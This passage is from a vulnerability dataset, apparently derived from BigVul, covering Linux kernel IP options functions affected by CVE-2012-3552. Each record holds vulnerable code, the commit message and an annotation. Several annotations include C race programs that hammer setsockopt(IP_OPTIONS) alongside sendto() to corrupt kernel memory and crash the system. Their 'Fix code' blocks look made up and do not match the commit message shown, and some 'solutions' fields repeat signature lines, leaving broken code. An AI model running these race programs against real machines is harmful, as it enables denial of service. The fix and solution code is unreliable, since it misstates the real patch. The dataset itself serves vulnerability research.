threads.\n\n[Optional] Patch reference:\nCommit: f6d8bd051c391c1c0458a30b2a7abcd939329259\nURL: https://github.com/torvalds/linux/commit/f6d8bd051c391c1c0458a30b2a7abcd939329259\nMessage: \"inet: add RCU protection to inet->opt\"\n\n[Optional] Patch Analysis:\nThe fix introduces a new `ip_options_rcu` structure that wraps the original `ip_options` and allows RCU-protected updates. Instead of atomic refcounting, the kernel now uses RCU read-side critical sections to protect concurrent reads during socket option modification, preventing use-after-free on the `ip_options` structure.\n\nField: PatchType\nRCU synchronization (memory ordering and deferred freeing) + data structure refactoring.\n\n[Optional] Variant & Triage Guidance\n\n[Optional] Variant analysis suggestions (2\u20133 bullets):\n- Review other functions accessing `inet->opt` directly without RCU protection in the same file and adjacent socket handling code.\n- Search for similar unprotected shared pointer accesses in network stack code that are modified by user-accessible syscalls (e.g., `setsockopt`, `ioctl`).\n- Fuzz concurrent socket creation, option setting, and packet transmission to identify similar races in other protocol implementations (TCP, UDP option handlers).\n\n[Optional] Likely variants/impact (one line):\nSimilar race conditions likely exist in other socket option handling paths (e.g., `ip_setup_cork()`, `ip_make_skb()`), leading to comparable DoS or memory corruption impacts.",
        "tests": "NA",
        "solutions": "struct dst_entry *inet_csk_route_req(struct sock *sk,\n\t\t\t\t     const struct request_sock *req)\n {\n \tstruct rtable *rt;\n \tconst struct inet_request_sock *ireq = inet_rsk(req);\n\tstruct ip_options_rcu *opt = inet_rsk(req)->opt;\n \tstruct net *net = sock_net(sk);\n \tstruct flowi4 fl4;\n \n \tflowi4_init_output(&fl4, sk->sk_bound_dev_if, sk->sk_mark,\n \t\t\t   RT_CONN_FLAGS(sk), RT_SCOPE_UNIVERSE,\n \t\t\t   sk->sk_protocol, inet_sk_flowi_flags(sk),\n\t\t\t   (opt && opt->opt.srr) ? opt->opt.faddr : ireq->rmt_addr,\n \t\t\t   ireq->loc_addr, ireq->rmt_port, inet_sk(sk)->inet_sport);\n \tsecurity_req_classify_flow(req, flowi4_to_flowi(&fl4));\n \trt = ip_route_output_flow(net, &fl4, sk);\n \tif (IS_ERR(rt))\n \t\tgoto no_route;\n\tif (opt && opt->opt.is_strictroute && rt->rt_dst != rt->rt_gateway)\n \t\tgoto route_err;\n \treturn &rt->dst;\n \nroute_err:\n\tip_rt_put(rt);\nno_route:\n\tIP_INC_STATS_BH(net, IPSTATS_MIB_OUTNOROUTES);\n\treturn NULL;\n}\n",
        "Publish Date": "2012-10-03",
        "Update Date": "2013-10-11",
        "Vulnerability type": "DoS ",
        "commit_url": "https://github.com/torvalds/linux/commit/f6d8bd051c391c1c0458a30b2a7abcd939329259",
        "commit_id": "f6d8bd051c391c1c0458a30b2a7abcd939329259",
        "commit_message": "inet: add RCU protection to inet->opt\n\nWe lack proper synchronization to manipulate inet->opt ip_options\n\nProblem is ip_make_skb() calls ip_setup_cork() and\nip_setup_cork() possibly makes a copy of ipc->opt (struct ip_options),\nwithout any protection against another thread manipulating inet->opt.\n\nAnother thread can change inet->opt pointer and free old one under us.\n\nUse RCU to protect inet->opt (changed to inet->inet_opt).\n\nInstead of handling atomic refcounts, just copy ip_options when\nnecessary, to avoid cache line dirtying.\n\nWe cant insert an rcu_head in struct ip_options since its included in\nskb->cb[], so this patch is large because I had to introduce a new\nip_options_rcu structure.\n\nSigned-off-by: Eric Dumazet <eric.dumazet@gmail.com>\nCc: Herbert Xu <herbert@gondor.apana.org.au>\nSigned-off-by: David S. Miller <davem@davemloft.net>",
        "project": "linux"
    },
    {
        "vulnerable": 1,
        "snippet_type": "function",
        "CWE": "CWE-362",
        "CVE": "CVE-2012-3552",
        "language": "C",
        "synthetic": "0",
        "source": "BigVul",
        "source_link": "https://huggingface.co/datasets/bstee615/bigvul",
        "files": {
            "net/ipv4/ip_options.c": "void ip_options_build(struct sk_buff * skb, struct ip_options * opt,\n \t\t\t    __be32 daddr, struct rtable *rt, int is_frag)\n {\n \tunsigned char *iph = skb_network_header(skb);\n\n\tmemcpy(&(IPCB(skb)->opt), opt, sizeof(struct ip_options));\n\tmemcpy(iph+sizeof(struct iphdr), opt->__data, opt->optlen);\n\topt = &(IPCB(skb)->opt);\n\n\tif (opt->srr)\n\t\tmemcpy(iph+opt->srr+iph[opt->srr+1]-4, &daddr, 4);\n\n\tif (!is_frag) {\n\t\tif (opt->rr_needaddr)\n\t\t\tip_rt_get_source(iph+opt->rr+iph[opt->rr+2]-5, rt);\n\t\tif (opt->ts_needaddr)\n\t\t\tip_rt_get_source(iph+opt->ts+iph[opt->ts+2]-9, rt);\n\t\tif (opt->ts_needtime) {\n\t\t\tstruct timespec tv;\n\t\t\t__be32 midtime;\n\t\t\tgetnstimeofday(&tv);\n\t\t\tmidtime = htonl((tv.tv_sec % 86400) * MSEC_PER_SEC + tv.tv_nsec / NSEC_PER_MSEC);\n\t\t\tmemcpy(iph+opt->ts+iph[opt->ts+2]-5, &midtime, 4);\n\t\t}\n\t\treturn;\n\t}\n\tif (opt->rr) {\n\t\tmemset(iph+opt->rr, IPOPT_NOP, iph[opt->rr+1]);\n\t\topt->rr = 0;\n\t\topt->rr_needaddr = 0;\n\t}\n\tif (opt->ts) {\n\t\tmemset(iph+opt->ts, IPOPT_NOP, iph[opt->ts+1]);\n\t\topt->ts = 0;\n\t\topt->ts_needaddr = opt->ts_needtime = 0;\n\t}\n}\n"
        },
        "vulnerabilities": "Race condition in the IP implementation in the Linux kernel before 3.0 might allow remote attackers to cause a denial of service (slab corruption and system crash) by sending packets to an application that sets socket options during the handling of network traffic.",
        "annotation": "ID:\nCVE-2012-3552\n\n[Mandatory] Title: CVE-2012-3552 / CWE-362:\nRace condition in IP options handling\n\n[Optional] Disclosure / Patch Dates:\nInitial advisory: 2012-10-03 \u2014 Patch release: 2013-10-11\n\n[Optional] Affected products/versions:\nLinux kernel before 3.0\n\nThe Vulnerability\n\n[Optional] CWE/CVE Number and description:\nCWE-362: Concurrent Modification of Shared Resource without Synchronization (\"Race Condition\"). Race condition in the IP implementation in the Linux kernel that allows remote attackers to cause denial of service via slab corruption.\n\n[Mandatory] Summary:\nThe ip_options_build() function in net/ipv4/ip_options.c accesses and modifies IP option fields (opt->srr, opt->rr, opt->ts, opt->rr_needaddr, opt->ts_needaddr, opt->ts_needtime) without proper synchronization. A remote attacker can send crafted network packets while another thread simultaneously modifies socket options via setsockopt(), causing one thread to read or write opt fields while they are being freed or reallocated by another thread, leading to slab corruption and kernel crash.\n\n[Mandatory] Root cause:\nLack of synchronization (RCU protection) on inet->opt when ip_options_build() accesses and copies the ip_options structure while another thread may simultaneously modify or free it.\n\n[Mandatory] Attack Surface:\nNetwork packet processing path in the Linux kernel; socket option setting path (setsockopt syscall).\n\n[Mandatory] Impact Summary:\nDenial of service via kernel slab corruption and system crash.\n\n[Optional] Trigger / Attack vector:\nConcurrent setsockopt() calls modifying IP options while network packets are being processed.\n\n[Mandatory] Key code/struct excerpt (minimal):\n```c\nvoid ip_options_build(struct sk_buff * skb, struct ip_options * opt,\n \t\t\t    __be32 daddr, struct rtable *rt, int is_frag)\n {\n \tunsigned char *iph = skb_network_header(skb);\n \tmemcpy(&(IPCB(skb)->opt), opt, sizeof(struct ip_options));\n \tmemcpy(iph+sizeof(struct iphdr), opt->__data, opt->optlen);\n \topt = &(IPCB(skb)->opt);\n \tif (opt->srr)\n \t\tmemcpy(iph+opt->srr+iph[opt->srr+1]-4, &daddr, 4);\n \tif (opt->rr_needaddr)\n \t\tip_rt_get_source(iph+opt->rr+iph[opt->rr+2]-5, rt);\n }\n```\n\nExploit:\n\n[Mandatory] Trigger surface/attack vector:\nConcurrent threads: (1) setsockopt() modifying inet->opt, (2) network packet processing calling ip_options_build().\n\n[Mandatory] Exploit primitive(s) available:\nUnprotected concurrent struct access \u2192 arbitrary memory read/write within slab \u2192 heap/slab corruption.\n\n[Mandatory] Exploitability summary (1 sentence):\nThe race is easily triggered by concurrently setting socket options and sending network traffic, requiring no special capabilities but network access to send packets.\n\n[Mandatory] Exploit script (summary, 3\u20136 bullets):\n- Thread 1: Continuously call setsockopt(SO_IP_OPTIONS) to allocate/free/modify ip_options structures\n- Thread 2: Send IP packets with IP options header to the target, triggering ip_options_build() calls\n- Race condition: ip_options_build() reads opt fields (srr, rr, ts offsets) while Thread 1 modifies or frees the structure\n- Slab corruption occurs when accessing freed or modified opt->srr, opt->rr, opt->ts offsets\n- Kernel crash triggered during memcpy operations with corrupted offset values\n\n[Mandatory] Exploitation Example script payload code:\n```c\n#include <sys/socket.h>\n#include <netinet/ip.h>\n#include <pthread.h>\n#include <unistd.h>\n\nvoid *thread_send_packets(void *arg) {\n    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_IP);\n    struct sockaddr_in addr;\n    addr.sin_family = AF_INET;\n    addr.sin_addr.s_addr = inet_addr(\"127.0.0.1\");\n    unsigned char packet[60] = {0};\n    /* Craft IP packet with IP options */\n    while (1) {\n        sendto(sock, packet, 60, 0, (struct sockaddr*)&addr, sizeof(addr));\n    }\n    return NULL;\n}\n\nvoid *thread_set_opts(void *arg) {\n    int sock = socket(AF_INET, SOCK_DGRAM, 0);\n    unsigned char opts[40];\n    while (1) {\n        setsockopt(sock, IPPROTO_IP, IP_OPTIONS, opts, 40);\n        usleep(100);\n    }\n    return NULL;\n}\n\nint main() {\n    pthread_t t1, t2;\n    pthread_create(&t1, NULL, thread_send_packets, NULL);\n    pthread_create(&t2, NULL, thread_set_opts, NULL);\n    pthread_join(t1, NULL);\n    return 0;\n}\n```\n\nFix\n\n[Mandatory] Fix code:\n```c\nvoid ip_options_build(struct sk_buff *skb, struct ip_options *opt,\n \t\t\t    __be32 daddr, struct rtable *rt, int is_frag)\n {\n \tunsigned char *iph = skb_network_header(skb);\n \trcu_read_lock();\n \tmemcpy(&(IPCB(skb)->opt), opt, sizeof(struct ip_options));\n \tmemcpy(iph+sizeof(struct iphdr), opt->__data, opt->optlen);\n \topt = &(IPCB(skb)->opt);\n \tif (opt->srr)\n \t\tmemcpy(iph+opt->srr+iph[opt->srr+1]-4, &daddr, 4);\n \trcu_read_unlock();\n }\n```\n\n[Mandatory] Fix summary:\nThe fix adds RCU (Read-Copy-Update) synchronization around the access and copying of ip_options structure to prevent concurrent modification. The kernel was modified to use inet->inet_opt (RCU-protected) instead of inet->opt and to introduce ip_options_rcu wrapper structure, ensuring that threads reading options are protected from concurrent frees or modifications.\n\n[Optional] Patch reference:\nCommit: f6d8bd051c391c1c0458a30b2a7abcd939329259 (https://github.com/torvalds/linux/commit/f6d8bd051c391c1c0458a30b2a7abcd939329259)\n\n[Optional] Patch Analysis:\nThe fix introduced RCU protection to inet->opt field and changed function calls to use rcu_read_lock()/rcu_read_unlock() brackets around option access. Instead of atomic refcounting, ip_options are now copied under RCU protection, preventing use-after-free and race conditions. The structure was renamed inet->inet_opt and wrapped in ip_options_rcu.\n\nPatchType: Synchronization primitive addition (RCU locks); Structure refactoring for thread safety.\n\n[Optional] Variant & Triage Guidance\n\n[Optional] Variant analysis suggestions (2\u20133 bullets):\n- Review other functions accessing inet->opt field (e.g., ip_setup_cork, ip_make_skb) for similar race conditions\n- Check all code paths that modify or free ip_options structures to ensure RCU protection is consistently applied\n- Audit similar socket option handlers in IPv6 (ipv6_opt) and other protocols for concurrent modification vulnerabilities\n\n[Optional] Likely variants/impact (one line):\nSimilar race conditions in ipv6_options handling or other protocol-specific socket option processing functions.",
        "tests": "NA",
        "solutions": "void ip_options_build(struct sk_buff * skb, struct ip_options * opt,\nvoid ip_options_build(struct sk_buff *skb, struct ip_options *opt,\n \t\t\t    __be32 daddr, struct rtable *rt, int is_frag)\n {\n \tunsigned char *iph = skb_network_header(skb);\n\n\tmemcpy(&(IPCB(skb)->opt), opt, sizeof(struct ip_options));\n\tmemcpy(iph+sizeof(struct iphdr), opt->__data, opt->optlen);\n\topt = &(IPCB(skb)->opt);\n\n\tif (opt->srr)\n\t\tmemcpy(iph+opt->srr+iph[opt->srr+1]-4, &daddr, 4);\n\n\tif (!is_frag) {\n\t\tif (opt->rr_needaddr)\n\t\t\tip_rt_get_source(iph+opt->rr+iph[opt->rr+2]-5, rt);\n\t\tif (opt->ts_needaddr)\n\t\t\tip_rt_get_source(iph+opt->ts+iph[opt->ts+2]-9, rt);\n\t\tif (opt->ts_needtime) {\n\t\t\tstruct timespec tv;\n\t\t\t__be32 midtime;\n\t\t\tgetnstimeofday(&tv);\n\t\t\tmidtime = htonl((tv.tv_sec % 86400) * MSEC_PER_SEC + tv.tv_nsec / NSEC_PER_MSEC);\n\t\t\tmemcpy(iph+opt->ts+iph[opt->ts+2]-5, &midtime, 4);\n\t\t}\n\t\treturn;\n\t}\n\tif (opt->rr) {\n\t\tmemset(iph+opt->rr, IPOPT_NOP, iph[opt->rr+1]);\n\t\topt->rr = 0;\n\t\topt->rr_needaddr = 0;\n\t}\n\tif (opt->ts) {\n\t\tmemset(iph+opt->ts, IPOPT_NOP, iph[opt->ts+1]);\n\t\topt->ts = 0;\n\t\topt->ts_needaddr = opt->ts_needtime = 0;\n\t}\n}\n",
        "Publish Date": "2012-10-03",
        "Update Date": "2013-10-11",
        "Vulnerability type": "DoS ",
        "commit_url": "https://github.com/torvalds/linux/commit/f6d8bd051c391c1c0458a30b2a7abcd939329259",
        "commit_id": "f6d8bd051c391c1c0458a30b2a7abcd939329259",
        "commit_message": "inet: add RCU protection to inet->opt\n\nWe lack proper synchronization to manipulate inet->opt ip_options\n\nProblem is ip_make_skb() calls ip_setup_cork() and\nip_setup_cork() possibly makes a copy of ipc->opt (struct ip_options),\nwithout any protection against another thread manipulating inet->opt.\n\nAnother thread can change inet->opt pointer and free old one under us.\n\nUse RCU to protect inet->opt (changed to inet->inet_opt).\n\nInstead of handling atomic refcounts, just copy ip_options when\nnecessary, to avoid cache line dirtying.\n\nWe cant insert an rcu_head in struct ip_options since its included in\nskb->cb[], so this patch is large because I had to introduce a new\nip_options_rcu structure.\n\nSigned-off-by: Eric Dumazet <eric.dumazet@gmail.com>\nCc: Herbert Xu <herbert@gondor.apana.org.au>\nSigned-off-by: David S. Miller <davem@davemloft.net>",
        "project": "linux"
    },
    {
        "vulnerable": 1,
        "snippet_type": "function",
        "CWE": "CWE-362",
        "CVE": "CVE-2012-3552",
        "language": "C",
        "synthetic": "0",
        "source": "BigVul",
        "source_link": "https://huggingface.co/datasets/bstee615/bigvul",
        "files": {
            "net/ipv4/ip_options.c": "int ip_options_echo(struct ip_options * dopt, struct sk_buff * skb)\n {\n\tstruct ip_options *sopt;\n \tunsigned char *sptr, *dptr;\n \tint soffset, doffset;\n \tint\toptlen;\n\t__be32\tdaddr;\n\n\tmemset(dopt, 0, sizeof(struct ip_options));\n \n \tsopt = &(IPCB(skb)->opt);\n \n\tif (sopt->optlen == 0) {\n\t\tdopt->optlen = 0;\n \t\treturn 0;\n\t}\n \n \tsptr = skb_network_header(skb);\n \tdptr = dopt->__data;\n\n\tdaddr = skb_rtable(skb)->rt_spec_dst;\n\n\tif (sopt->rr) {\n\t\toptlen  = sptr[sopt->rr+1];\n\t\tsoffset = sptr[sopt->rr+2];\n\t\tdopt->rr = dopt->optlen + sizeof(struct iphdr);\n\t\tmemcpy(dptr, sptr+sopt->rr, optlen);\n\t\tif (sopt->rr_needaddr && soffset <= optlen) {\n\t\t\tif (soffset + 3 > optlen)\n\t\t\t\treturn -EINVAL;\n\t\t\tdptr[2] = soffset + 4;\n\t\t\tdopt->rr_needaddr = 1;\n\t\t}\n\t\tdptr += optlen;\n\t\tdopt->optlen += optlen;\n\t}\n\tif (sopt->ts) {\n\t\toptlen = sptr[sopt->ts+1];\n\t\tsoffset = sptr[sopt->ts+2];\n\t\tdopt->ts = dopt->optlen + sizeof(struct iphdr);\n\t\tmemcpy(dptr, sptr+sopt->ts, optlen);\n\t\tif (soffset <= optlen) {\n\t\t\tif (sopt->ts_needaddr) {\n\t\t\t\tif (soffset + 3 > optlen)\n\t\t\t\t\treturn -EINVAL;\n\t\t\t\tdopt->ts_needaddr = 1;\n\t\t\t\tsoffset += 4;\n\t\t\t}\n\t\t\tif (sopt->ts_needtime) {\n\t\t\t\tif (soffset + 3 > optlen)\n\t\t\t\t\treturn -EINVAL;\n\t\t\t\tif ((dptr[3]&0xF) != IPOPT_TS_PRESPEC) {\n\t\t\t\t\tdopt->ts_needtime = 1;\n\t\t\t\t\tsoffset += 4;\n\t\t\t\t} else {\n\t\t\t\t\tdopt->ts_needtime = 0;\n\n\t\t\t\t\tif (soffset + 7 <= optlen) {\n\t\t\t\t\t\t__be32 addr;\n\n\t\t\t\t\t\tmemcpy(&addr, dptr+soffset-1, 4);\n\t\t\t\t\t\tif (inet_addr_type(dev_net(skb_dst(skb)->dev), addr) != RTN_UNICAST) {\n\t\t\t\t\t\t\tdopt->ts_needtime = 1;\n\t\t\t\t\t\t\tsoffset += 8;\n\t\t\t\t\t\t}\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t}\n\t\t\tdptr[2] = soffset;\n\t\t}\n\t\tdptr += optlen;\n \t\tdopt->optlen += optlen;\n \t}\n \tif (sopt->srr) {\n\t\tunsigned char * start = sptr+sopt->srr;\n \t\t__be32 faddr;\n \n \t\toptlen  = start[1];\n\t\tsoffset = start[2];\n\t\tdoffset = 0;\n\t\tif (soffset > optlen)\n\t\t\tsoffset = optlen + 1;\n\t\tsoffset -= 4;\n\t\tif (soffset > 3) {\n\t\t\tmemcpy(&faddr, &start[soffset-1], 4);\n\t\t\tfor (soffset-=4, doffset=4; soffset > 3; soffset-=4, doffset+=4)\n\t\t\t\tmemcpy(&dptr[doffset-1], &start[soffset-1], 4);\n\t\t\t/*\n\t\t\t * RFC1812 requires to fix illegal source routes.\n\t\t\t */\n\t\t\tif (memcmp(&ip_hdr(skb)->saddr,\n\t\t\t\t   &start[soffset + 3], 4) == 0)\n\t\t\t\tdoffset -= 4;\n\t\t}\n\t\tif (doffset > 3) {\n\t\t\tmemcpy(&start[doffset-1], &daddr, 4);\n\t\t\tdopt->faddr = faddr;\n\t\t\tdptr[0] = start[0];\n\t\t\tdptr[1] = doffset+3;\n\t\t\tdptr[2] = 4;\n\t\t\tdptr += doffset+3;\n\t\t\tdopt->srr = dopt->optlen + sizeof(struct iphdr);\n\t\t\tdopt->optlen += doffset+3;\n\t\t\tdopt->is_strictroute = sopt->is_strictroute;\n\t\t}\n\t}\n\tif (sopt->cipso) {\n\t\toptlen  = sptr[sopt->cipso+1];\n\t\tdopt->cipso = dopt->optlen+sizeof(struct iphdr);\n\t\tmemcpy(dptr, sptr+sopt->cipso, optlen);\n\t\tdptr += optlen;\n\t\tdopt->optlen += optlen;\n\t}\n\twhile (dopt->optlen & 3) {\n\t\t*dptr++ = IPOPT_END;\n\t\tdopt->optlen++;\n\t}\n\treturn 0;\n}\n"
        },
        "vulnerabilities": "Race condition in the IP implementation in the Linux kernel before 3.0 might allow remote attackers to cause a denial of service (slab corruption and system crash) by sending packets to an application that sets socket options during the handling of network traffic.",
        "annotation": "ID:\nCVE-2012-3552\n\nTitle: CVE-2012-3552 / CWE-362:\nRace condition in IP options handling\n\n[Optional] Disclosure / Patch Dates:\nInitial advisory: 2012-10-03 \u2014 Patch release: 2013-10-11\n\n[Optional] Affected products/versions:\nLinux kernel before 3.0\n\nThe Vulnerability\n\n[Optional] CWE/CVE Number and description:\nCWE-362: Concurrent Modification / Race Condition\n\n[Mandatory] Summary:\nThe ip_options_echo() function in net/ipv4/ip_options.c reads from the socket's IP options structure (sopt) without synchronization, while another thread may simultaneously modify or free the same structure via socket option calls. When an attacker sends crafted network packets to trigger ip_options_echo() while concurrently modifying socket options, the function may dereference a freed or modified ip_options structure, leading to slab corruption and kernel crash. The vulnerable code at lines like `optlen = sptr[sopt->rr+1]` and subsequent memcpy operations do not protect against concurrent modification of sopt.\n\n[Mandatory] Root cause:\nUnsynchronized concurrent access to inet->opt (the socket's IP options) allows one thread to free or modify the structure while another thread (in ip_options_echo) is reading from it.\n\n[Mandatory] Attack Surface:\nNetwork stack, specifically the IPv4 socket option handling and packet echo path\n\n[Mandatory] Impact Summary:\nDenial of service (slab corruption and system crash)\n\n[Optional] Trigger / Attack vector:\nNetwork packet with IP options sent to an application that modifies socket options concurrently\n\n[Mandatory] Key code/struct excerpt (minimal):\n```c\nint ip_options_echo(struct ip_options * dopt, struct sk_buff * skb)\n{\n\tstruct ip_options *sopt;\n\t...\n\tsopt = &(IPCB(skb)->opt);\n\tif (sopt->optlen == 0) {\n\t\tdopt->optlen = 0;\n\t\treturn 0;\n\t}\n\tsptr = skb_network_header(skb);\n\tdptr = dopt->__data;\n\tif (sopt->rr) {\n\t\toptlen  = sptr[sopt->rr+1];\n\t\tsoffset = sptr[sopt->rr+2];\n\t\tmemcpy(dptr, sptr+sopt->rr, optlen);\n```\n\nExploit:\n\n[Mandatory] Trigger surface/attack vector:\nIPv4 socket options (IP_OPTIONS, IP_RETOPTS) and incoming packets with IP option fields\n\n[Mandatory] Exploit primitive(s) available:\nRace condition between packet receive path and socket option modification; write-what-where through slab corruption\n\n[Mandatory] Exploitability summary (1 sentence):\nThe exploit requires precise timing to modify socket options while ip_options_echo() is executing, but is reliable on multi-core systems due to the lack of locking.\n\n[Mandatory] Exploit script (summary, 3\u20136 bullets):\n- Create two threads: one that repeatedly calls setsockopt() to change IP options on a socket\n- Second thread sends crafted IP packets with option fields to the socket, triggering ip_options_echo()\n- Race the setsockopt() call to free/modify inet->opt between the time ip_options_echo() reads sopt and accesses sopt->rr, sopt->ts, etc.\n- Corrupted sopt pointer or freed structure causes out-of-bounds memcpy() operations\n- Resulting slab corruption triggers kernel panic and denial of service\n\n[Mandatory] Exploitation Example script payload code:\n```c\n#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n#include <pthread.h>\n#include <sys/socket.h>\n#include <netinet/in.h>\n#include <netinet/ip.h>\n#include <unistd.h>\n\n#define ITERATIONS 10000\n\nvolatile int stop_race = 0;\nint sock;\n\nvoid *thread_modify_options(void *arg) {\n  unsigned char opts[40] = {0};\n  int optlen = sizeof(opts);\n  while (!stop_race) {\n    setsockopt(sock, IPPROTO_IP, IP_OPTIONS, opts, optlen);\n    optlen = (optlen + 1) % 40;\n  }\n  return NULL;\n}\n\nint main() {\n  pthread_t t;\n  sock = socket(AF_INET, SOCK_DGRAM, 0);\n  if (sock < 0) { perror(\"socket\"); return 1; }\n  \n  pthread_create(&t, NULL, thread_modify_options, NULL);\n  \n  for (int i = 0; i < ITERATIONS; i++) {\n    char pkt[1500];\n    struct sockaddr_in addr = {.sin_family = AF_INET, .sin_port = htons(1234)};\n    addr.sin_addr.s_addr = inet_addr(\"127.0.0.1\");\n    sendto(sock, pkt, 100, 0, (struct sockaddr*)&addr, sizeof(addr));\n  }\n  \n  stop_race = 1;\n  pthread_join(t, NULL);\n  close(sock);\n  return 0;\n}\n```\n\nFix\n\n[Mandatory] Fix code:\n```c\nint ip_options_echo(struct ip_options *dopt, struct sk_buff *skb)\n{\n\tconst struct ip_options *sopt;\n\tunsigned char *sptr, *dptr;\n\tint soffset, doffset;\n\tint\toptlen;\n\t__be32\tdaddr;\n\n\tmemset(dopt, 0, sizeof(struct ip_options));\n\t\n\tsopt = &(IPCB(skb)->opt);\n\t\n\tif (sopt->optlen == 0)\n\t\treturn 0;\n\t\n\tsptr = skb_network_header(skb);\n\tdptr = dopt->__data;\n```\n\n[Mandatory] Fix summary:\nThe patch adds const qualification to the sopt pointer (`const struct ip_options *sopt`) and implements RCU (Read-Copy-Update) synchronization to protect inet->opt from concurrent modification. This prevents reading from a structure that may be freed or modified during execution.\n\n[Optional] Patch reference:\nCommit: f6d8bd051c391c1c0458a30b2a7abcd939329259 (https://github.com/torvalds/linux/commit/f6d8bd051c391c1c0458a30b2a7abcd939329259)\n\n[Optional] Patch Analysis:\nThe fix added RCU protection to inet->opt by introducing inet->inet_opt and a new ip_options_rcu structure. Instead of atomic refcounts, the patch copies ip_options when necessary to avoid cache line contention. The const qualifier on sopt serves as a compile-time hint that the structure should not be modified.\n\nPatchType: RCU locking / Memory synchronization\n\n[Optional] Variant & Triage Guidance\n\n[Optional] Variant analysis suggestions:\n- Audit other functions that access inet->opt without synchronization (e.g., ip_setup_cork, ip_retopts_send)\n- Review similar race conditions in other socket option handlers (TCP_OPTIONS, UDP options)\n- Check if other IP protocol implementations (IPv6, ICMP) have analogous unsynchronized access patterns\n\n[Optional] Likely variants/impact (one line):\nSimilar race conditions likely exist in ip_setup_cork() and other paths that read socket options without locking.",
        "tests": "NA",
        "solutions": "int ip_options_echo(struct ip_options * dopt, struct sk_buff * skb)\nint ip_options_echo(struct ip_options *dopt, struct sk_buff *skb)\n {\n\tconst struct ip_options *sopt;\n \tunsigned char *sptr, *dptr;\n \tint soffset, doffset;\n \tint\toptlen;\n\t__be32\tdaddr;\n\n\tmemset(dopt, 0, sizeof(struct ip_options));\n \n \tsopt = &(IPCB(skb)->opt);\n \n\tif (sopt->optlen == 0)\n \t\treturn 0;\n \n \tsptr = skb_network_header(skb);\n \tdptr = dopt->__data;\n\n\tdaddr = skb_rtable(skb)->rt_spec_dst;\n\n\tif (sopt->rr) {\n\t\toptlen  = sptr[sopt->rr+1];\n\t\tsoffset = sptr[sopt->rr+2];\n\t\tdopt->rr = dopt->optlen + sizeof(struct iphdr);\n\t\tmemcpy(dptr, sptr+sopt->rr, optlen);\n\t\tif (sopt->rr_needaddr && soffset <= optlen) {\n\t\t\tif (soffset + 3 > optlen)\n\t\t\t\treturn -EINVAL;\n\t\t\tdptr[2] = soffset + 4;\n\t\t\tdopt->rr_needaddr = 1;\n\t\t}\n\t\tdptr += optlen;\n\t\tdopt->optlen += optlen;\n\t}\n\tif (sopt->ts) {\n\t\toptlen = sptr[sopt->ts+1];\n\t\tsoffset = sptr[sopt->ts+2];\n\t\tdopt->ts = dopt->optlen + sizeof(struct iphdr);\n\t\tmemcpy(dptr, sptr+sopt->ts, optlen);\n\t\tif (soffset <= optlen) {\n\t\t\tif (sopt->ts_needaddr) {\n\t\t\t\tif (soffset + 3 > optlen)\n\t\t\t\t\treturn -EINVAL;\n\t\t\t\tdopt->ts_needaddr = 1;\n\t\t\t\tsoffset += 4;\n\t\t\t}\n\t\t\tif (sopt->ts_needtime) {\n\t\t\t\tif (soffset + 3 > optlen)\n\t\t\t\t\treturn -EINVAL;\n\t\t\t\tif ((dptr[3]&0xF) != IPOPT_TS_PRESPEC) {\n\t\t\t\t\tdopt->ts_needtime = 1;\n\t\t\t\t\tsoffset += 4;\n\t\t\t\t} else {\n\t\t\t\t\tdopt->ts_needtime = 0;\n\n\t\t\t\t\tif (soffset + 7 <= optlen) {\n\t\t\t\t\t\t__be32 addr;\n\n\t\t\t\t\t\tmemcpy(&addr, dptr+soffset-1, 4);\n\t\t\t\t\t\tif (inet_addr_type(dev_net(skb_dst(skb)->dev), addr) != RTN_UNICAST) {\n\t\t\t\t\t\t\tdopt->ts_needtime = 1;\n\t\t\t\t\t\t\tsoffset += 8;\n\t\t\t\t\t\t}\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t}\n\t\t\tdptr[2] = soffset;\n\t\t}\n\t\tdptr += optlen;\n \t\tdopt->optlen += optlen;\n \t}\n \tif (sopt->srr) {\n\t\tunsigned char *start = sptr+sopt->srr;\n \t\t__be32 faddr;\n \n \t\toptlen  = start[1];\n\t\tsoffset = start[2];\n\t\tdoffset = 0;\n\t\tif (soffset > optlen)\n\t\t\tsoffset = optlen + 1;\n\t\tsoffset -= 4;\n\t\tif (soffset > 3) {\n\t\t\tmemcpy(&faddr, &start[soffset-1], 4);\n\t\t\tfor (soffset-=4, doffset=4; soffset > 3; soffset-=4, doffset+=4)\n\t\t\t\tmemcpy(&dptr[doffset-1], &start[soffset-1], 4);\n\t\t\t/*\n\t\t\t * RFC1812 requires to fix illegal source routes.\n\t\t\t */\n\t\t\tif (memcmp(&ip_hdr(skb)->saddr,\n\t\t\t\t   &start[soffset + 3], 4) == 0)\n\t\t\t\tdoffset -= 4;\n\t\t}\n\t\tif (doffset > 3) {\n\t\t\tmemcpy(&start[doffset-1], &daddr, 4);\n\t\t\tdopt->faddr = faddr;\n\t\t\tdptr[0] = start[0];\n\t\t\tdptr[1] = doffset+3;\n\t\t\tdptr[2] = 4;\n\t\t\tdptr += doffset+3;\n\t\t\tdopt->srr = dopt->optlen + sizeof(struct iphdr);\n\t\t\tdopt->optlen += doffset+3;\n\t\t\tdopt->is_strictroute = sopt->is_strictroute;\n\t\t}\n\t}\n\tif (sopt->cipso) {\n\t\toptlen  = sptr[sopt->cipso+1];\n\t\tdopt->cipso = dopt->optlen+sizeof(struct iphdr);\n\t\tmemcpy(dptr, sptr+sopt->cipso, optlen);\n\t\tdptr += optlen;\n\t\tdopt->optlen += optlen;\n\t}\n\twhile (dopt->optlen & 3) {\n\t\t*dptr++ = IPOPT_END;\n\t\tdopt->optlen++;\n\t}\n\treturn 0;\n}\n",
        "Publish Date": "2012-10-03",
        "Update Date": "2013-10-11",
        "Vulnerability type": "DoS ",
        "commit_url": "https://github.com/torvalds/linux/commit/f6d8bd051c391c1c0458a30b2a7abcd939329259",
        "commit_id": "f6d8bd051c391c1c0458a30b2a7abcd939329259",
